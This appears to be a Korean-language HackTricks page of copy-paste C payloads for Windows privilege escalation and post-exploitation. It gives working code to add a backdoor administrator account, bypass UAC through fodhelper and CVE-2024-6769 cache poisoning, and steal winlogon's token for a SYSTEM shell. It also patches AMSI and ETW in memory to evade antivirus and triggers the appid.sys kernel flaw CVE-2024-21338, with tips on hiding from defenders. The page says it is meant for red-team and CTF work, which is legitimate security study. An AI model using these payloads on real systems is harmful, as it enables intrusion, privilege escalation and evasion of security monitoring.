# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 Windows Local Privilege Escalation 또는 post-exploitation 상황에서 유용한 **작고 독립적인 C 스니펫들**을 모아둡니다. 각 payload는 **복사-붙여넣기 친화적**으로 설계되었으며 Windows API / C runtime만 필요하고 `i686-w64-mingw32-gcc` (x86) 또는 `x86_64-w64-mingw32-gcc` (x64)로 컴파일할 수 있습니다.

> ⚠️  이 payload들은 해당 작업을 수행하는 데 필요한 최소 권한(예: `SeDebugPrivilege`, `SeImpersonatePrivilege`, 또는 UAC bypass를 위한 medium-integrity 컨텍스트)을 이미 프로세스가 가지고 있다고 가정합니다. 이들은 취약점 악용으로 arbitrary native code execution이 확보된 **red-team 또는 CTF 환경**을 위한 것입니다.

---

## 로컬 관리자 사용자 추가
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
신뢰된 바이너리 **`fodhelper.exe`**가 실행되면, 아래 레지스트리 경로를 쿼리하며 **`DelegateExecute` 동사를 필터링하지 않습니다.**  해당 키 아래에 명령을 심어두면 공격자는 *파일을 디스크에 기록하지 않고*도 UAC를 우회할 수 있습니다.

*`fodhelper.exe`가 쿼리하는 레지스트리 경로*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
권한 상승된 `cmd.exe`를 띄우는 최소 PoC:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Windows 10 22H2 및 Windows 11 23H2(2025년 7월 패치)에서 테스트했습니다. 우회가 여전히 작동하는 이유는 Microsoft가 `DelegateExecute` 경로의 무결성 검사 누락을 수정하지 않았기 때문입니다.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning은 `ctfmon.exe`가 높은 무결성의 신뢰된 UI 프로세스로 실행되어 호출자의 가장된 `C:` 드라이브에서 기꺼이 로드하고 `CSRSS`가 캐시한 DLL 리디렉션을 재사용하기 때문에 패치된 Windows 10/11 빌드에서도 여전히 효과가 있습니다. 악용 흐름은 다음과 같습니다: `C:`를 공격자 제어 스토리지로 재지정하고 트로이화된 `msctf.dll`을 배치한 뒤 `ctfmon.exe`를 실행해 높은 무결성을 얻고, `CSRSS`에 auto-elevated 바이너리(예: `fodhelper.exe`)에서 사용하는 DLL을 리디렉션하도록 매니페스트를 캐싱하게 요청하면 다음 실행 시 UAC 프롬프트 없이 페이로드가 상속됩니다.

실제 워크플로:
1. 가짜 %SystemRoot%\System32 트리를 준비하고 탈취하려는 정품 바이너리(대개 `ctfmon.exe`)를 복사합니다.
2. `DefineDosDevice(DDD_RAW_TARGET_PATH)`를 사용해 프로세스 내에서 `C:`를 재매핑하고, 변경이 로컬에만 적용되도록 `DDD_NO_BROADCAST_SYSTEM`을 유지합니다.
3. 가짜 트리에 DLL과 매니페스트를 배치하고 `CreateActCtx/ActivateActCtx`를 호출해 매니페스트를 activation-context 캐시에 푸시한 다음, auto-elevated 바이너리를 실행하여 리디렉션된 DLL이 바로 당신의 쉘코드로 로드되게 합니다.
4. 작업이 끝나면 캐시 항목(`sxstrace ClearCache`)을 삭제하거나 재부팅하여 공격자 흔적을 지웁니다.

<details>
<summary>C - 가짜 드라이브 + 매니페스트 오염 도우미 (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

정리 팁: SYSTEM 권한을 얻은 후 테스트할 때 `sxstrace Trace -logfile %TEMP%\sxstrace.etl`를 호출하고 이어서 `sxstrace Parse`를 실행하세요 — 로그에서 매니페스트 이름이 보이면 방어자도 볼 수 있으므로, 매번 경로를 교체하세요.

---

## 토큰 복제를 통해 SYSTEM 셸 생성 (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
현재 프로세스가 **둘 다** `SeDebug` 및 `SeImpersonate` 권한을 보유하고 있다면(많은 서비스 계정에서 흔함), `winlogon.exe`에서 토큰을 훔쳐 복제한 뒤 권한 상승된 프로세스를 시작할 수 있습니다:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
작동 방식에 대한 자세한 설명은 다음을 참조하세요:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
대부분의 최신 AV/EDR 엔진은 악성 동작을 검사하기 위해 **AMSI** 및 **ETW**에 의존합니다. 현재 프로세스 내부에서 두 인터페이스를 조기에 패치하면 스크립트 기반 payloads(예: PowerShell, JScript)가 스캔되는 것을 방지할 수 있습니다.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*위의 패치는 프로세스 로컬입니다; 이를 실행한 후 새로운 PowerShell을 생성하면 AMSI/ETW 검사를 거치지 않고 실행됩니다.*

---

## 자식 프로세스를 Protected Process Light (PPL)로 생성
생성 시점에 자식에 대해 PPL 보호 수준을 `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`를 사용해 요청합니다. 이는 문서화된 API이며, 대상 이미지가 요청된 서명자 클래스(Windows/WindowsLight/Antimalware/LSA/WinTcb)에 대해 서명되어 있어야만 성공합니다.
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
가장 일반적으로 사용되는 레벨:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Process Explorer/Process Hacker에서 Protection 열을 확인하여 결과를 검증하세요.

---

## Local Service -> Kernel via `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys`는 디바이스 객체(`\\.\\AppID`)를 노출하며, 해당 smart-hash 유지보수 IOCTL은 호출자가 `LOCAL SERVICE`로 실행될 때 사용자 제공 함수 포인터를 허용합니다; Lazarus는 이를 악용해 PPL을 비활성화하고 임의 드라이버를 로드합니다. 따라서 red team은 랩 환경에서 사용할 준비된 트리거를 갖추어야 합니다.

운영 노트:
- 여전히 `LOCAL SERVICE` 토큰이 필요합니다. `SeImpersonatePrivilege`를 사용해 `Schedule`이나 `WdiServiceHost`에서 토큰을 훔친 뒤, 장치에 접근하기 전에 권한 대리(impersonate)하여 ACL 검사가 통과되게 하세요.
- IOCTL `0x22A018`는 두 개의 콜백 포인터(길이 조회 + 읽기 함수)를 포함하는 구조체를 기대합니다. 둘 다 토큰 덮어쓰기나 ring-0 primitives를 매핑하는 user-mode 스텁을 가리키게 하되, 버퍼는 RWX로 유지하여 KernelPatchGuard가 체인 중간에 크래시되지 않도록 하세요.
- 성공 후에는 권한 대리를 종료하고 디바이스 핸들을 복원하세요; 방어자는 예상치 못한 `Device\\AppID` 핸들을 찾기 때문에 권한을 획득한 즉시 닫아야 합니다.

<details>
<summary>C - `appid.sys` smart-hash abuse를 위한 스켈레톤 트리거</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

무기화된 빌드의 최소 수정: `VirtualAlloc`으로 RWX 섹션을 매핑하고, 거기에 token duplication stub을 복사한 다음 `KernelThunk = section`으로 설정하세요. `DeviceIoControl`이 반환되면 PPL 하에서도 SYSTEM이 되어야 합니다.

---

## 참조
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – 최소 PPL 프로세스 런처: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)

{{#include ../../banners/hacktricks-training.md}}
